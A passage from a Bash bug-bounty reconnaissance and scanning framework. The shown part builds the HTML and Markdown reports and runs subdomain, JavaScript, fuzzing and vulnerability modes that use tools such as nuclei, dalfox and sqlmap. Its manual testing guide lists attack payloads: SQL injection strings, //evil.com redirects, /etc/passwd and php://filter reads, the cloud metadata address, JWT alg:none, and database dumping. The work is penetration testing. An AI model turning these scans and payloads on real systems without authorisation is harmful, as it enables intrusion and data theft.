    echo "      <hr class=\"sep\"><h3 style=\"color:var(--red);font-family:'Orbitron',monospace;font-size:0.8em;margin-bottom:10px\">SECRETS IN JS</h3>"
    head -20 "$WORKSPACE/js/secrets_found.txt" | while read -r line; do
        echo "      <div class=\"vuln-item critical\"><span class=\"badge critical\">SECRET</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done
fi)
    </div>
  </div>

  <!-- RECON SUMMARY -->
  <div class="section">
    <div class="section-header"><div class="section-num">01</div><h2>RECONNAISSANCE SUMMARY</h2></div>
    <div class="section-body">
      <ul class="file-list">
        <li><span>All Subdomains</span><span class="file-count">$n_subdomains</span></li>
        <li><span>Resolved/Live</span><span class="file-count">$n_live</span></li>
        <li><span>Status 200</span><span class="file-count">$(wc -l < "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null || echo 0)</span></li>
        <li><span>Status 403</span><span class="file-count">$(wc -l < "$WORKSPACE/subdomains/status_403.txt" 2>/dev/null || echo 0)</span></li>
        <li><span>Status 401</span><span class="file-count">$(wc -l < "$WORKSPACE/subdomains/status_401.txt" 2>/dev/null || echo 0)</span></li>
        <li><span>403 Bypasses</span><span class="file-count" style="color:var(--red)">$n_bypass</span></li>
        <li><span>Total URLs</span><span class="file-count">$n_urls</span></li>
        <li><span>JS Files</span><span class="file-count">$n_js</span></li>
        <li><span>Endpoints</span><span class="file-count">$n_endpoints</span></li>
        <li><span>Parameters</span><span class="file-count">$n_params</span></li>
      </ul>
    </div>
  </div>

  <!-- INTERESTING PATHS -->
  <div class="section">
    <div class="section-header"><div class="section-num">02</div><h2>INTERESTING PATHS & ENDPOINTS</h2></div>
    <div class="section-body">
      <div class="path-grid">
$(head -100 "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null | while read -r line; do
    echo "        <div class=\"path-item\">$line</div>"
done)
      </div>
      <div class="info-box" style="margin-top:15px">Full list: <code style="color:var(--green)">$WORKSPACE/endpoints/interesting_paths.txt</code></div>
    </div>
  </div>

  <!-- MANUAL TESTING GUIDE -->
  <div class="section">
    <div class="section-header"><div class="section-num" style="background:var(--yellow);color:var(--bg)">★</div><h2>MANUAL TESTING GUIDE & DIRECTIONS</h2></div>
    <div class="section-body">
      <table class="manual-table">
        <thead>
          <tr>
            <th>VULNERABILITY</th>
            <th>WHERE TO TEST</th>
            <th>HOW TO TEST</th>
            <th>TOOL</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td class="vuln-type">IDOR</td>
            <td class="where">$WORKSPACE/vulns/idor/id_params.txt<br>Numeric IDs in any URL/API response</td>
            <td class="how">Replace IDs with other user IDs. Test with 2 accounts. Try: /api/user/1 → /api/user/2. Check UUIDs too. Try negative, 0, large numbers.</td>
            <td><span class="tool-badge">Burp Suite</span><span class="tool-badge">Intruder</span></td>
          </tr>
          <tr>
            <td class="vuln-type">Auth Bypass</td>
            <td class="where">$WORKSPACE/vulns/idor/auth_endpoints.txt<br>/login /reset /forgot</td>
            <td class="how">Try: remove auth headers, swap JWT alg:none, tamper roles in JWT, try expired tokens, password reset poisoning (Host header), OAUTH misconfig.</td>
            <td><span class="tool-badge">Burp JWT</span><span class="tool-badge">jwt_tool</span></td>
          </tr>
          <tr>
            <td class="vuln-type">BAC (Broken Access)</td>
            <td class="where">$WORKSPACE/vulns/idor/privileged_endpoints.txt<br>$WORKSPACE/vulns/idor/bac_findings.txt</td>
            <td class="how">Login as low-priv user, access admin endpoints. Try role param tampering. Test horizontal (same role, diff user) and vertical (escalate role).</td>
            <td><span class="tool-badge">Burp</span><span class="tool-badge">Auth Analyzer</span></td>
          </tr>
          <tr>
            <td class="vuln-type">XSS</td>
            <td class="where">$WORKSPACE/urls/gf/xss.txt<br>All input fields, search params, error pages</td>
            <td class="how">Reflected: inject in params. Stored: in profile/comment fields. DOM: check JS sinks in $WORKSPACE/js/dom_xss_sinks.txt. Test CSP bypass. Try SVG, IMG onerror.</td>
            <td><span class="tool-badge">dalfox</span><span class="tool-badge">XSStrike</span></td>
          </tr>
          <tr>
            <td class="vuln-type">SQLi</td>
            <td class="where">$WORKSPACE/urls/gf/sqli.txt<br>All search/filter/ID params</td>
            <td class="how">Test ' OR 1=1--, SLEEP(5), error-based. Use sqlmap results in $WORKSPACE/vulns/sqli/. Try second-order SQLi in stored values.</td>
            <td><span class="tool-badge">sqlmap</span><span class="tool-badge">Burp</span></td>
          </tr>
          <tr>
            <td class="vuln-type">SSRF</td>
            <td class="where">$WORKSPACE/urls/gf/ssrf.txt<br>url=, redirect=, src=, image= params</td>
            <td class="how">Use Burp Collaborator or interactsh. Try internal: 169.254.169.254 (AWS), metadata.google.internal (GCP). Try redirects, DNS rebinding.</td>
            <td><span class="tool-badge">Burp Collab</span><span class="tool-badge">interactsh</span></td>
          </tr>
          <tr>
            <td class="vuln-type">LFI</td>
            <td class="where">$WORKSPACE/urls/gf/lfi.txt<br>file=, path=, page=, template= params</td>
            <td class="how">Try /etc/passwd, php://filter, ../../../. Check $WORKSPACE/vulns/lfi/. Try log poisoning if you can write to logs.</td>
            <td><span class="tool-badge">Burp</span><span class="tool-badge">ffuf</span></td>
          </tr>
          <tr>
            <td class="vuln-type">CSRF</td>
            <td class="where">$WORKSPACE/vulns/csrf/csrf_findings.txt<br>All POST forms without token</td>
            <td class="how">Open PoC files in $WORKSPACE/vulns/csrf/. Check SameSite cookie. Verify Referer validation. Test CORS misconfig with csrf_origins.</td>
            <td><span class="tool-badge">Burp</span><span class="tool-badge">PoC files</span></td>
          </tr>
          <tr>
            <td class="vuln-type">Open Redirect</td>
            <td class="where">$WORKSPACE/urls/gf/redirect.txt<br>redirect=, next=, return_url= params</td>
            <td class="how">Inject: //evil.com, /\evil.com, %0d%0a, javascript:alert(1). Check for URL parsing flaws. Use for OAuth token theft.</td>
            <td><span class="tool-badge">Burp</span><span class="tool-badge">Manual</span></td>
          </tr>
          <tr>
            <td class="vuln-type">403 Bypass</td>
            <td class="where">$WORKSPACE/paths/403_bypass.txt<br>All 403 endpoints</td>
            <td class="how">Results already tested. Try: X-Original-URL, X-Forwarded-For: 127.0.0.1, path normalization tricks /%2f/, /./admin.</td>
            <td><span class="tool-badge">curl</span><span class="tool-badge">Burp</span></td>
          </tr>
          <tr>
            <td class="vuln-type">Secrets in JS</td>
            <td class="where">$WORKSPACE/js/secrets_found.txt<br>$WORKSPACE/js/potential_secrets.txt</td>
            <td class="how">Review all findings. Test API keys (try AWS, Google, Stripe). Check for exposed tokens in localStorage. Try hardcoded credentials.</td>
            <td><span class="tool-badge">Manual</span><span class="tool-badge">truffleHog</span></td>
          </tr>
          <tr>
            <td class="vuln-type">GraphQL</td>
            <td class="where">/graphql, /api/graphql, /gql endpoints</td>
            <td class="how">Enable introspection, dump schema. Test IDOR via nested queries. Try batching attacks. Check query depth limit bypass.</td>
            <td><span class="tool-badge">GraphQL Voyager</span><span class="tool-badge">InQL</span></td>
          </tr>
          <tr>
            <td class="vuln-type">Subdomain Takeover</td>
            <td class="where">$WORKSPACE/subdomains/all_subdomains.txt</td>
            <td class="how">Look for CNAME pointing to unclaimed services (GitHub Pages, Heroku, S3, Netlify). Check for 404 on CDN endpoints.</td>
            <td><span class="tool-badge">subjack</span><span class="tool-badge">nuclei</span></td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- HOW TO USE THIS REPORT -->
  <div class="section">
    <div class="section-header"><div class="section-num" style="background:var(--green);color:var(--bg)">▶</div><h2>HOW TO USE THIS REPORT — STEP BY STEP</h2></div>
    <div class="section-body">

      <div class="guide-step">
        <h3>STEP 1 — START WITH CRITICAL/HIGH NUCLEI FINDINGS</h3>
        <p>Open and review nuclei findings immediately. These are known vulnerability signatures with high confidence.</p>
        <code>cat $WORKSPACE/vulns/nuclei/nuclei_critical_high.txt
cat $WORKSPACE/vulns/nuclei/nuclei_cves.txt</code>
      </div>

      <div class="guide-step">
        <h3>STEP 2 — CHECK SECRETS & EXPOSED KEYS IN JS</h3>
        <p>Any secret found is typically a direct critical/high finding for bug bounty.</p>
        <code>cat $WORKSPACE/js/secrets_found.txt
cat $WORKSPACE/js/potential_secrets.txt
cat $WORKSPACE/js/aws_keys.txt</code>
      </div>

      <div class="guide-step">
        <h3>STEP 3 — MANUAL IDOR TESTING</h3>
        <p>Open Burp Suite. Set up 2 accounts. Use Param Miner extension. Test all numeric IDs found:</p>
        <code>cat $WORKSPACE/vulns/idor/id_params.txt
# Load these URLs in Burp, swap IDs between sessions using "Auth Analyzer" extension</code>
      </div>

      <div class="guide-step">
        <h3>STEP 4 — LOAD INTERESTING PATHS IN BURP</h3>
        <p>Import these into Burp Target scope and spider from there:</p>
        <code>cat $WORKSPACE/endpoints/interesting_paths.txt
cat $WORKSPACE/vulns/idor/privileged_endpoints.txt
cat $WORKSPACE/vulns/idor/auth_endpoints.txt</code>
      </div>

      <div class="guide-step">
        <h3>STEP 5 — TEST SSRF WITH BURP COLLABORATOR</h3>
        <p>Get a Burp Collaborator payload, then manually test these URLs:</p>
        <code>cat $WORKSPACE/urls/gf/ssrf.txt
# In Burp Intruder, replace values with your collaborator URL
# Also test: http://169.254.169.254/latest/meta-data/ directly</code>
      </div>

      <div class="guide-step">
        <h3>STEP 6 — VALIDATE XSS FINDINGS</h3>
        <p>dalfox results may have false positives — validate each manually:</p>
        <code>cat $WORKSPACE/vulns/xss/dalfox_results.txt
# Load in browser, confirm execution context, build PoC</code>
      </div>

      <div class="guide-step">
        <h3>STEP 7 — OPEN CSRF POC FILES</h3>
        <p>CSRF PoC HTML files are ready to open in browser:</p>
        <code>ls $WORKSPACE/vulns/csrf/csrf_poc_*.html
# Open each in browser while logged into target to confirm</code>
      </div>

      <div class="guide-step">
        <h3>STEP 8 — EXPLOIT SQLI FINDINGS</h3>
        <p>Review sqlmap output, try manual confirmation:</p>
        <code>ls $WORKSPACE/vulns/sqli/sqlmap_output/
# Dump interesting tables manually or via sqlmap --dump</code>
      </div>

      <div class="guide-step">
        <h3>STEP 9 — TEST PARAMETERS WITH PARAM MINER</h3>
        <p>Load all discovered parameters into Burp Param Miner for hidden param discovery:</p>
        <code>cat $WORKSPACE/params/all_params.txt
# Import to Param Miner wordlist for each live endpoint</code>
      </div>

      <div class="guide-step">
        <h3>STEP 10 — COMPILE & REPORT</h3>
        <p>For each confirmed finding, document: URL, param, payload, impact, PoC steps, screenshot.</p>
        <code>ls $WORKSPACE/reports/
# This HTML report: $rpt/report.html
# Markdown report: $rpt/report.md</code>
      </div>

    </div>
  </div>

  <!-- ALL DATA FILES -->
  <div class="section">
    <div class="section-header"><div class="section-num">📁</div><h2>ALL COLLECTED DATA FILES</h2></div>
    <div class="section-body">
      <ul class="file-list">
        <li><span>📂 Subdomains (all)</span><span class="file-count"><a href="file://$WORKSPACE/subdomains/all_subdomains.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 Live URLs</span><span class="file-count"><a href="file://$WORKSPACE/subdomains/live_urls.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 All URLs</span><span class="file-count"><a href="file://$WORKSPACE/urls/all_urls.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 URLs with Params</span><span class="file-count"><a href="file://$WORKSPACE/urls/urls_with_params.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 JS Endpoints</span><span class="file-count"><a href="file://$WORKSPACE/js/all_js_endpoints.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 All Endpoints</span><span class="file-count"><a href="file://$WORKSPACE/endpoints/all_endpoints.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 Interesting Paths</span><span class="file-count"><a href="file://$WORKSPACE/endpoints/interesting_paths.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 All Parameters</span><span class="file-count"><a href="file://$WORKSPACE/params/all_params.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 Nuclei Full</span><span class="file-count"><a href="file://$WORKSPACE/vulns/nuclei/nuclei_full.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 Nuclei CVEs</span><span class="file-count"><a href="file://$WORKSPACE/vulns/nuclei/nuclei_cves.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 Secrets</span><span class="file-count"><a href="file://$WORKSPACE/js/secrets_found.txt" style="color:var(--red)">Open</a></span></li>
        <li><span>📂 XSS Results</span><span class="file-count"><a href="file://$WORKSPACE/vulns/xss/dalfox_results.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 LFI Confirmed</span><span class="file-count"><a href="file://$WORKSPACE/vulns/lfi/lfi_confirmed.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 SSRF Hits</span><span class="file-count"><a href="file://$WORKSPACE/vulns/ssrf/ssrf_hits.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 CSRF Findings</span><span class="file-count"><a href="file://$WORKSPACE/vulns/csrf/csrf_findings.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 403 Bypasses</span><span class="file-count"><a href="file://$WORKSPACE/paths/403_bypass.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 BAC Candidates</span><span class="file-count"><a href="file://$WORKSPACE/vulns/idor/bac_findings.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 GF XSS URLs</span><span class="file-count"><a href="file://$WORKSPACE/urls/gf/xss.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 GF SQLi URLs</span><span class="file-count"><a href="file://$WORKSPACE/urls/gf/sqli.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 GF SSRF URLs</span><span class="file-count"><a href="file://$WORKSPACE/urls/gf/ssrf.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 GF LFI URLs</span><span class="file-count"><a href="file://$WORKSPACE/urls/gf/lfi.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 GF Redirect URLs</span><span class="file-count"><a href="file://$WORKSPACE/urls/gf/redirect.txt" style="color:var(--accent)">Open</a></span></li>
        <li><span>📂 Master Log</span><span class="file-count"><a href="file://$LOG_MASTER" style="color:var(--accent)">Open</a></span></li>
      </ul>
    </div>
  </div>

</div>

<div class="footer">
  BUG FRAMEWORK | Target: $DOMAIN | $date_str | Duration: ${DURATION_MIN}min<br>
  ⚡ AUTHORIZED TESTING ONLY — USE RESPONSIBLY ⚡
</div>

</body>
</html>
HTMLEOF

    log OK "HTML report generated: $rpt/report.html"

    # ── MARKDOWN REPORT ───────────────────────────────────────
    cat > "$rpt/report.md" << MDEOF
# 🐛 BUG FRAMEWORK — Security Report
## Target: \`$DOMAIN\`
**Date:** $date_str | **Duration:** ${DURATION_MIN} minutes | **Mode:** $([ "$QUICK" = true ] && echo "QUICK" || echo "FULL AGGRESSIVE")

---

## 📊 Summary Statistics

| Category | Count |
|---|---|
| Subdomains Found | $n_subdomains |
| Live Hosts | $n_live |
| URLs Collected | $n_urls |
| JS Files | $n_js |
| Endpoints | $n_endpoints |
| Parameters | $n_params |
| Nuclei Findings | $n_nuclei |
| Critical Findings | $n_critical |
| High Findings | $n_high |
| XSS Hits | $n_xss |
| LFI Confirmed | $n_lfi |
| SSRF Hits | $n_ssrf |
| CSRF Findings | $n_csrf |
| Secrets in JS | $n_secrets |
| 403 Bypasses | $n_bypass |
| BAC Candidates | $n_bac |

---

## 🔴 Critical & High Findings

### Nuclei Critical/High
\`\`\`
$(cat "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" 2>/dev/null | head -50 || echo "None found")
\`\`\`

### XSS (dalfox)
\`\`\`
$(cat "$WORKSPACE/vulns/xss/dalfox_results.txt" 2>/dev/null | head -20 || echo "None found")
\`\`\`

### LFI Confirmed
\`\`\`
$(cat "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" 2>/dev/null || echo "None confirmed")
\`\`\`

### SSRF Hits
\`\`\`
$(cat "$WORKSPACE/vulns/ssrf/ssrf_hits.txt" 2>/dev/null || echo "None found")
\`\`\`

### Secrets in JS
\`\`\`
$(cat "$WORKSPACE/js/secrets_found.txt" 2>/dev/null | head -20 || echo "None found")
\`\`\`

### 403 Bypasses
\`\`\`
$(cat "$WORKSPACE/paths/403_bypass.txt" 2>/dev/null || echo "None found")
\`\`\`

---

## 🎯 Key Files for Manual Testing

| File | Purpose |
|---|---|
| \`$WORKSPACE/subdomains/live_urls.txt\` | All live targets |
| \`$WORKSPACE/urls/urls_with_params.txt\` | All URLs with parameters |
| \`$WORKSPACE/endpoints/interesting_paths.txt\` | High-value paths |
| \`$WORKSPACE/params/all_params.txt\` | All discovered parameters |
| \`$WORKSPACE/vulns/idor/id_params.txt\` | IDOR candidates |
| \`$WORKSPACE/vulns/idor/auth_endpoints.txt\` | Auth endpoints |
| \`$WORKSPACE/vulns/idor/privileged_endpoints.txt\` | Admin/privileged endpoints |
| \`$WORKSPACE/urls/gf/xss.txt\` | XSS candidate URLs |
| \`$WORKSPACE/urls/gf/sqli.txt\` | SQLi candidate URLs |
| \`$WORKSPACE/urls/gf/ssrf.txt\` | SSRF candidate URLs |
| \`$WORKSPACE/urls/gf/redirect.txt\` | Open redirect candidates |
| \`$WORKSPACE/vulns/csrf/csrf_findings.txt\` | CSRF findings |
| \`$WORKSPACE/vulns/csrf/csrf_poc_*.html\` | CSRF PoC files |

---

## 📋 Top Interesting Paths

\`\`\`
$(head -50 "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null || echo "None found")
\`\`\`

---

## 🔑 All Discovered Parameters

\`\`\`
$(cat "$WORKSPACE/params/all_params.txt" 2>/dev/null | head -100)
\`\`\`

---

## 📖 Manual Testing Checklist

### IDOR
- [ ] Identify numeric/UUID params in \`$WORKSPACE/vulns/idor/id_params.txt\`
- [ ] Create 2 accounts on target
- [ ] Swap IDs between accounts in all API calls
- [ ] Test horizontal: user A accessing user B's data
- [ ] Test vertical: user escalating to admin data
- [ ] Try predictable IDs: sequential, YYYYMMDD format

### Authentication
- [ ] Test JWT (alg:none, weak secret, role tampering)
- [ ] Password reset poisoning (Host header injection)
- [ ] Account enumeration (timing/response differences)
- [ ] Brute force protection bypass
- [ ] OAuth misconfigurations (redirect_uri, state param)
- [ ] SSO bypass techniques

### Broken Access Control
- [ ] Access admin paths unauthenticated (check \`bac_findings.txt\`)
- [ ] Force browse to files directly
- [ ] Test HTTP method switching (GET → POST)
- [ ] Check \`privileged_endpoints.txt\` while logged in as low-priv user
- [ ] Test API versioning: /v1/admin → /v2/admin

### XSS
- [ ] Validate dalfox results manually in browser
- [ ] Check DOM XSS sinks in \`dom_xss_sinks.txt\`
- [ ] Test stored XSS in all user-input fields
- [ ] Check CSP headers and bypass potential
- [ ] Test in all input contexts: HTML, JS, attr, URL

### SQLi
- [ ] Review sqlmap output directories
- [ ] Manual test: ' and 1=1-- on all params
- [ ] Try second-order SQLi in stored values
- [ ] Check error messages for DB version leaks

### SSRF
- [ ] Load \`gf/ssrf.txt\` in Burp with Collaborator payload
- [ ] Test cloud metadata endpoints directly
- [ ] Check for DNS rebinding possibilities
- [ ] Test via file upload URLs, webhook URLs

### CSRF
- [ ] Open each PoC HTML file in \`csrf/\` while logged in
- [ ] Check SameSite cookie attribute
- [ ] Test CORS headers for misconfig

---
*Generated by BUG FRAMEWORK | Authorized testing only*
MDEOF

    log OK "Markdown report generated: $rpt/report.md"
}

# ══════════════════════════════════════════════════════════════
# FINAL SUMMARY PRINT
# ══════════════════════════════════════════════════════════════
print_final_summary() {
    local rpt="$WORKSPACE/reports"
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║           🐛 BUG FRAMEWORK — SCAN COMPLETE 🐛                ║${NC}"
    echo -e "${BOLD}${CYAN}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  Target    : ${BOLD}$DOMAIN${NC}"
    echo -e "${CYAN}║${NC}  Workspace : ${BOLD}$WORKSPACE${NC}"
    echo -e "${CYAN}║${NC}  Duration  : ${BOLD}${DURATION_MIN} minutes${NC}"
    echo -e "${BOLD}${CYAN}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}📄 HTML Report :${NC} $rpt/report.html"
    echo -e "${CYAN}║${NC}  ${GREEN}📝 MD Report   :${NC} $rpt/report.md"
    echo -e "${CYAN}║${NC}  ${GREEN}📂 Workspace   :${NC} $WORKSPACE"
    echo -e "${BOLD}${CYAN}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${RED}🔴 Critical   :${NC} $n_critical     ${YELLOW}🟡 High  :${NC} $n_high"
    echo -e "${CYAN}║${NC}  ${MAGENTA}🐛 XSS       :${NC} $n_xss     ${RED}🔴 LFI   :${NC} $n_lfi"
    echo -e "${CYAN}║${NC}  ${ORANGE}🔀 SSRF      :${NC} $n_ssrf     ${YELLOW}🛡️  CSRF  :${NC} $n_csrf"
    echo -e "${CYAN}║${NC}  ${RED}🔑 Secrets   :${NC} $n_secrets     ${GREEN}🚪 403 Bypass :${NC} $n_bypass"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}📌 NEXT STEPS:${NC}"
    echo -e "  1. Open: ${CYAN}xdg-open $rpt/report.html${NC}"
    echo -e "  2. Review critical nuclei:  ${CYAN}cat $WORKSPACE/vulns/nuclei/nuclei_critical_high.txt${NC}"
    echo -e "  3. Load in Burp Suite:      ${CYAN}cat $WORKSPACE/endpoints/interesting_paths.txt${NC}"
    echo -e "  4. Check secrets:           ${CYAN}cat $WORKSPACE/js/secrets_found.txt${NC}"
    echo -e "  5. Test IDOR:               ${CYAN}cat $WORKSPACE/vulns/idor/id_params.txt${NC}"
    echo ""
}



# ══════════════════════════════════════════════════════════════
# -sub MODE — SUBDOMAIN ENUMERATION ONLY
# ══════════════════════════════════════════════════════════════
run_sub_mode() {
    section_header "-sub MODE — SUBDOMAIN ENUMERATION ONLY"
    module_subdomains
    module_httpx
    local n_sub; n_sub=$(wc -l < "$WORKSPACE/subdomains/all_subdomains.txt" 2>/dev/null || echo 0)
    local n_live; n_live=$(wc -l < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || echo 0)
    echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🐛 -sub MODE COMPLETE                   ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC}  Subdomains : ${RED}$n_sub${NC}"
    echo -e "${RED}║${NC}  Live hosts : ${RED}$n_live${NC}"
    echo -e "${RED}╚══════════════════════════════════════════╝${NC}"
    echo -e "  All subs  : ${RED}cat $WORKSPACE/subdomains/all_subdomains.txt${NC}"
    echo -e "  Live only : ${RED}cat $WORKSPACE/subdomains/live_urls.txt${NC}"
    echo -e "  Status 200: ${RED}cat $WORKSPACE/subdomains/status_200.txt${NC}"
    echo -e "  Status 403: ${RED}cat $WORKSPACE/subdomains/status_403.txt${NC}"
}

# ══════════════════════════════════════════════════════════════
# -js MODE — JS ANALYSIS ONLY
# ══════════════════════════════════════════════════════════════
run_js_mode() {
    section_header "-js MODE — JAVASCRIPT ANALYSIS ONLY"
    # Need live URLs first
    if [[ ! -f "$WORKSPACE/subdomains/live_urls.txt" ]]; then
        log INFO "No live_urls.txt found — running quick httpx probe first..."
        subfinder -d "$DOMAIN" -silent 2>/dev/null |             httpx -silent -threads 50 -timeout 8 -o "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null
        echo "https://$DOMAIN" >> "$WORKSPACE/subdomains/live_urls.txt"
        sort -u -o "$WORKSPACE/subdomains/live_urls.txt" "$WORKSPACE/subdomains/live_urls.txt"
    fi
    # Need URLs for JS extraction
    if [[ ! -f "$WORKSPACE/urls/all_urls.txt" ]]; then
        log INFO "Collecting URLs for JS discovery..."
        mkdir -p "$WORKSPACE/urls"
        timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$WORKSPACE/urls/all_urls.txt"
        timeout 120 gau --threads 5 "$DOMAIN" 2>/dev/null | sort -u >> "$WORKSPACE/urls/all_urls.txt"
        sort -u -o "$WORKSPACE/urls/all_urls.txt" "$WORKSPACE/urls/all_urls.txt"
    fi
    module_js
    local n_js; n_js=$(wc -l < "$WORKSPACE/js/js_urls.txt" 2>/dev/null || echo 0)
    local n_secrets; n_secrets=$(wc -l < "$WORKSPACE/js/secrets_found.txt" 2>/dev/null || echo 0)
    local n_ep; n_ep=$(wc -l < "$WORKSPACE/js/all_js_endpoints.txt" 2>/dev/null || echo 0)
    echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🐛 -js MODE COMPLETE                    ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC}  JS Files  : ${RED}$n_js${NC}"
    echo -e "${RED}║${NC}  Endpoints : ${RED}$n_ep${NC}"
    echo -e "${RED}║${NC}  Secrets   : ${RED}$n_secrets${NC}"
    echo -e "${RED}╚══════════════════════════════════════════╝${NC}"
    echo -e "  Secrets   : ${RED}cat $WORKSPACE/js/secrets_found.txt${NC}"
    echo -e "  Endpoints : ${RED}cat $WORKSPACE/js/all_js_endpoints.txt${NC}"
    echo -e "  AWS Keys  : ${RED}cat $WORKSPACE/js/aws_keys.txt${NC}"
}

# ══════════════════════════════════════════════════════════════
# -fuzz MODE — DIRECTORY BRUTEFORCE ONLY
# ══════════════════════════════════════════════════════════════
run_fuzz_mode() {
    section_header "-fuzz MODE — DIRECTORY BRUTEFORCE + 403 BYPASS"
    if [[ ! -f "$WORKSPACE/subdomains/live_urls.txt" ]]; then
        log INFO "No live_urls.txt — running quick probe..."
        echo "https://$DOMAIN" > "$WORKSPACE/subdomains/live_urls.txt"
        subfinder -d "$DOMAIN" -silent 2>/dev/null |             httpx -silent -threads 50 -timeout 8 >> "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null
        sort -u -o "$WORKSPACE/subdomains/live_urls.txt" "$WORKSPACE/subdomains/live_urls.txt"
    fi
    module_paths
    local n_ep; n_ep=$(wc -l < "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || echo 0)
    local n_int; n_int=$(wc -l < "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null || echo 0)
    local n_byp; n_byp=$(wc -l < "$WORKSPACE/paths/403_bypass.txt" 2>/dev/null || echo 0)
    echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🐛 -fuzz MODE COMPLETE                  ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC}  Endpoints   : ${RED}$n_ep${NC}"
    echo -e "${RED}║${NC}  Interesting : ${RED}$n_int${NC}"
    echo -e "${RED}║${NC}  403 Bypass  : ${RED}$n_byp${NC}"
    echo -e "${RED}╚══════════════════════════════════════════╝${NC}"
    echo -e "  Interesting : ${RED}cat $WORKSPACE/endpoints/interesting_paths.txt${NC}"
    echo -e "  403 Bypass  : ${RED}cat $WORKSPACE/paths/403_bypass.txt${NC}"
    echo -e "  All paths   : ${RED}cat $WORKSPACE/endpoints/all_endpoints.txt${NC}"
}

# ══════════════════════════════════════════════════════════════
# -vuln MODE — VULNERABILITY SCAN ONLY
# ══════════════════════════════════════════════════════════════
run_vuln_mode() {
    section_header "-vuln MODE — VULNERABILITY SCANNING ONLY"
    if [[ ! -f "$WORKSPACE/subdomains/live_urls.txt" ]]; then
        log INFO "No live_urls.txt — running quick probe..."
        echo "https://$DOMAIN" > "$WORKSPACE/subdomains/live_urls.txt"
        subfinder -d "$DOMAIN" -silent 2>/dev/null |             httpx -silent -threads 50 -timeout 8 >> "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null
        sort -u -o "$WORKSPACE/subdomains/live_urls.txt" "$WORKSPACE/subdomains/live_urls.txt"
    fi
    if [[ ! -f "$WORKSPACE/urls/all_urls.txt" ]]; then
        log INFO "No URLs found — collecting first..."
        mkdir -p "$WORKSPACE/urls"
        timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" > "$WORKSPACE/urls/all_urls.txt"
        timeout 120 gau --threads 5 "$DOMAIN" 2>/dev/null >> "$WORKSPACE/urls/all_urls.txt"
        grep -E "\?[a-zA-Z0-9_]+=" "$WORKSPACE/urls/all_urls.txt" | sort -u > "$WORKSPACE/urls/urls_with_params.txt"
        mkdir -p "$WORKSPACE/urls/gf"
        for p in xss sqli ssrf lfi redirect; do
            gf "$p" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u > "$WORKSPACE/urls/gf/${p}.txt"
        done
    fi
    module_nuclei
    module_xss
    module_sqli
    module_ssrf
    module_lfi
    module_csrf
    local n_nuc; n_nuc=$(wc -l < "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_crit; n_crit=$(grep -c "critical\|CRITICAL" "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_xss; n_xss=$(wc -l < "$WORKSPACE/vulns/xss/dalfox_results.txt" 2>/dev/null || echo 0)
    echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  🐛 -vuln MODE COMPLETE                  ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC}  Nuclei total   : ${RED}$n_nuc${NC}"
    echo -e "${RED}║${NC}  Critical       : ${RED}$n_crit${NC}"
    echo -e "${RED}║${NC}  XSS hits       : ${RED}$n_xss${NC}"
